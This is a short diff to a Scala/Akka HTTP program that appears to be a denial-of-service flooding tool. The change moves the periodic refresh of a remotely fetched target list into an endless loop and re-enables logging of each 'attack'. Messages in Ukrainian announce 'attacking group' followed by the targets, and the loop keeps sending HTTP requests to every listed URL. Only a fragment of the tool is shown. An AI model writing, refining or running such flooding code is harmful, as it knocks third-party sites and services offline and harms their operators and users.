@@ -62,17 +62,18 @@ object Test {
 
   var lastUpdate: Long = System.currentTimeMillis()
 
-  if (System.currentTimeMillis() - lastUpdate > REFRESH_TIME) {
-    file = fetchTargets
-    println(s"list updated. size=${file.size}")
-    lastUpdate = System.currentTimeMillis()
-  }
-
   def main(args: Array[String]): Unit = {
     implicit val system: ActorSystem = ActorSystem()
     implicit val executionContext: ExecutionContextExecutor = system.dispatcher
 
     while (true) {
+
+      if (System.currentTimeMillis() - lastUpdate > REFRESH_TIME) {
+        file = fetchTargets
+        println(s"list updated. size=${file.size}")
+        lastUpdate = System.currentTimeMillis()
+      }
+
       println(s"Атакую групу ${file.mkString("[", ", ", "]")}")
 
       file.foreach {
@@ -89,7 +90,7 @@ object Test {
     Http().singleRequest(HttpRequest(uri = str)).flatMap {
       case HttpResponse(StatusCodes.OK, _, _, _) =>
         if (!recursion) {
-          //println(s"attack $str")
+          println(s"attack $str")
         } else {
           println(s"attack after redirect $str")
         }
